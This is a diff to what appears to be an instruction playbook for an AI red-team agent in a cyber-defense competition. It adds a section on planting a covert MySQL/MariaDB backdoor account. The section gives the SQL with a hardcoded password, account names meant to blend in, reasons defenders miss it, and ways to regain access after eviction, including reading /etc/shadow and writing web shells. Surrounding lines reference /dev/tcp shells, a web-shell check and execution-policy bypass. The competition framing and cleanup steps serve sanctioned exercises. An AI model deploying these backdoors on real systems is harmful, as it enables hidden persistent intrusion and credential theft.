@@ -475,6 +475,46 @@ sed -i '/HEALTH_CHECK/d' /root/.bashrc
 sed -i '/dev\/tcp/d' /root/.bashrc
 ```
 
+### MySQL/MariaDB Backdoor Account
+
+Creating a backdoor database user is a persistence mechanism that lives entirely inside MySQL/MariaDB, independent of the operating system's user accounts, SSH keys, cron jobs, and services. Blue teams performing OS-level incident response (rotating passwords, removing SSH keys, auditing cron, reviewing systemd units) will not discover it because it exists only in the MySQL user privilege tables. This technique works on both Linux and Windows hosts running MySQL or MariaDB.
+
+**When to use:** Any host running MySQL/MariaDB where port 3306 is accessible from the jumpbox and you have credentials with MySQL root privileges or GRANT OPTION. In CCDC environments specifically, MySQL port 3306 is often firewall-allowed because the scoring engine needs database connectivity to verify service availability.
+
+**Deploy (requires MySQL root or GRANT OPTION):**
+```sql
+CREATE USER 'dba_monitor'@'%' IDENTIFIED BY 'M0n1t0r2026!';
+GRANT ALL PRIVILEGES ON *.* TO 'dba_monitor'@'%' WITH GRANT OPTION;
+FLUSH PRIVILEGES;
+```
+
+Choose account names that blend with legitimate DBA service accounts: `dba_monitor`, `db_healthcheck`, `repl_agent`, `backup_svc`. The `'%'` host specifier allows connection from any IP, including the jumpbox. If you want to restrict to jumpbox-only access (stealthier, but less resilient to jumpbox IP changes): `'dba_monitor'@'10.230.x.x'`.
+
+**Verify from jumpbox:**
+```
+mysql -h <target-IP> -u dba_monitor -p'M0n1t0r2026!' -e "SELECT user, host FROM mysql.user WHERE user='dba_monitor';"
+```
+
+A successful response confirms the backdoor is active and accessible over the network.
+
+**Why this is low-detection:**
+- Lives in MySQL's internal privilege tables, not in the filesystem, cron, systemd, or any OS-level persistence surface
+- A DBA-sounding account name (`dba_monitor`) blends with legitimate database administration accounts
+- Blue teams under time pressure focus on OS-level persistence (SSH keys, cron, services, accounts) and rarely audit `SELECT user FROM mysql.user` during incident response
+- No process, no scheduled task, no file on disk — nothing for filesystem-scanning tools to find
+
+**Post-remediation re-access path:** If the blue team evicts you from the OS (rotates all passwords, removes SSH keys, kills shells) but MySQL port 3306 remains open, the backdoor account provides direct database access without any OS shell. From the jumpbox: `mysql -h <target-IP> -u dba_monitor -p'M0n1t0r2026!'`. This gives you read/write access to all databases (credential stores, application configuration, potentially scoring data). On Linux MySQL installations with FILE privilege (included in ALL PRIVILEGES), you can read arbitrary files via `SELECT LOAD_FILE('/etc/shadow');` and write files via `SELECT ... INTO OUTFILE` — this can be leveraged to re-establish OS-level access (e.g., writing a web shell to the web root, writing an SSH key if MySQL runs as a user with write access to a home directory).
+
+**Pairs well with:** SSH key persistence and cron jobs. The MySQL backdoor covers a different persistence surface entirely — the blue team must audit the database layer separately from the OS layer. This is a strong "multiples of multiples" Axis 1 addition because it introduces a persistence category (database accounts) that shares zero detection surface with filesystem/process-based mechanisms.
+
+**Cleanup:**
+```sql
+DROP USER 'dba_monitor'@'%';
+FLUSH PRIVILEGES;
+```
+
+**PERSISTENCE-MANIFEST entry format:** Use type `db-account` and record the MySQL username, host specifier, target IP, and port. The cleanup command is the DROP USER statement above.
+
 ## Armageddon Phase Awareness
 
 Competition organizers may designate a destructive endgame phase. When OPS-001 signals that armageddon pre-staging is active, include the following in your persistence plans for each target:
@@ -488,7 +528,7 @@ Do NOT execute armageddon commands until OPS-001 confirms the organizer signal. 
 
 ## PERSISTENCE-MANIFEST.md Management
 
-Every persistence mechanism you recommend must be logged in coordination/PERSISTENCE-MANIFEST.md before the operator deploys it. Each entry must include the target IP and hostname, the persistence type (task/registry/wmi/service/cron/ssh/webshell/account), the exact deployment command, the trigger conditions (when it fires), the payload it executes, the cleanup command to remove it, the deployment timestamp (filled by operator after deployment), and the last verification timestamp.
+Every persistence mechanism you recommend must be logged in coordination/PERSISTENCE-MANIFEST.md before the operator deploys it. Each entry must include the target IP and hostname, the persistence type (task/registry/wmi/service/cron/ssh/webshell/account/db-account), the exact deployment command, the trigger conditions (when it fires), the payload it executes, the cleanup command to remove it, the deployment timestamp (filled by operator after deployment), and the last verification timestamp.
 
 This manifest serves three purposes: it enables the team to verify persistence across session boundaries, it provides the educational review material for post-competition debrief, and it ensures no orphaned persistence is left behind.
 
@@ -527,7 +567,7 @@ $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypas
 
 ## Verification Protocol
 
-After the operator deploys persistence, recommend verification commands. For scheduled tasks: `schtasks /query /tn "<taskname>" /v`. For registry keys: `reg query "<keypath>" /v "<valuename>"`. For WMI: `Get-WmiObject -Namespace "root\subscription" -Class __EventFilter`. For services: `sc query "<servicename>"`. For cron: `crontab -l` or `cat /etc/crontab`. For SSH keys: `cat /root/.ssh/authorized_keys`. For web shells: `curl http://<target>/health.php?c=id`.
+After the operator deploys persistence, recommend verification commands. For scheduled tasks: `schtasks /query /tn "<taskname>" /v`. For registry keys: `reg query "<keypath>" /v "<valuename>"`. For WMI: `Get-WmiObject -Namespace "root\subscription" -Class __EventFilter`. For services: `sc query "<servicename>"`. For cron: `crontab -l` or `cat /etc/crontab`. For SSH keys: `cat /root/.ssh/authorized_keys`. For web shells: `curl http://<target>/health.php?c=id`. For database accounts: `mysql -h <target> -u <backdoor-user> -p'<password>' -e "SELECT 1;"` (successful response confirms network-accessible login).
 
 ## Failure Detection and Technique Rotation Protocol
 
